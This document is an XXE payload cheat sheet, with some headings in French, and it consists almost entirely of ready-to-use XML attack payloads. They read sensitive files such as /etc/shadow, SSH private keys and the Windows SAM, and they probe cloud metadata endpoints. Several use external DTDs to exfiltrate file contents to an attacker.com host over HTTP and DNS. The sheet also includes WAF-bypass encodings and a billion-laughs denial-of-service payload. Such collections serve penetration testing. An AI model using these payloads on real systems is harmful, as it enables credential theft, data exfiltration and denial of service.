## Basic XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe "test"> ]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<root>&xxe;</root>
```

## Local File Inclusion

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/group"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/motd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/issue"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/version"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/cmdline"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/cmdline"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/maps"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/net/arp"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/net/route"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/net/tcp"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/net/udp"> ]>
```

### Fichiers Windows

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/networks"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/lmhosts.sam"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/boot.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/system.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/system32/config/SAM"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/system32/config/SYSTEM"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/system32/config/SECURITY"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/inetpub/logs/LogFiles/W3SVC1/"> ]>
```

## Fichiers spécifiques

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/apache2/error.log"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/nginx/access.log"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/nginx/error.log"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/index.php"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/.htaccess"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/user/.ssh/authorized_keys"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/user/.bash_history"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.bash_history"> ]>
```

## SSRF via XXE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:80"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:22"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:443"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:3306"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:5432"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:6379"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:27017"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/"> ]>
```

## Out-of-Band XXE (Blind)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/xxe"> ]>
<root>&xxe;</root>
```

```xml
<!DOCTYPE foo [ 
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root></root>
```

### External DTD (evil.dtd)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

## Parameter Entities

```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY callhome SYSTEM "http://attacker.com/?%xxe;">
]>
<root>&callhome;</root>
```

```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<root></root>
```

## Encoding Bypass

```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>

<!-- UTF-32 -->
<?xml version="1.0" encoding="UTF-32"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>

<!-- ISO-8859-1 -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

## Base64 Encoding

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root></root>
```

## Error-based XXE

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<root></root>
```

## XXE with CDATA

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=<![CDATA[%file;]]>'>">
%eval;
%exfil;
]>
<root></root>
```

## XXE in SOAP

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>
```

## XXE in SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## XXE dans RSS

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<rss version="2.0">
<channel>
<title>&xxe;</title>
</channel>
</rss>
```

## XXE dans DOCX

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p>
<w:r>
<w:t>&xxe;</w:t>
</w:r>
</w:p>
</w:body>
</w:document>
```

## XXE dans XLSX

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
<row>
<c t="inlineStr">
<is>
<t>&xxe;</t>
</is>
</c>
</row>
</sheetData>
</worksheet>
```

## WAF Bypass

```xml
<!-- Character encoding -->
<!DOCTYPE foo%20[%20<!ENTITY%20xxe%20SYSTEM%20"file:///etc/passwd">%20]>

<!-- Mixed case -->
<!DOCTYPE foo [ <!entity xxe SYSTEM "file:///etc/passwd"> ]>

<!-- Nested entities -->
<!DOCTYPE foo [
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY all "%start;%file;%end;">
]>
<root>&all;</root>

<!-- URL encoding -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file%3A%2F%2F%2Fetc%2Fpasswd"> ]>

<!-- Hex encoding -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;"> ]>
```

## JSON to XML

```json
{
  "data": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>&xxe;</root>"
}
```

## XXE via WSDL

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<definitions xmlns="http://schemas.xmlsoap.org/wsdl/">
  <documentation>&xxe;</documentation>
</definitions>
```

## Billion Laughs Attack

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## PHP Wrappers

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ="> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "zip://test.zip#test.txt"> ]>
```

## Advanced OOB XXE

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
%eval;
%exfiltrate;
]>
<root></root>
```

### Advanced evil.dtd

```xml
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com:8080/?data=%file;'>">
```

## XXE Exfiltration Techniques

### DNS Exfiltration

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfil;
]>
<root></root>
```

### HTTP Parameter Pollution

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?a=%file;&b=%file;'>">
%eval;
%exfil;
]>
<root></root>
```

## Polyglot XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root>
<!--?xml version="1.0" encoding="UTF-8"?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
</root>
```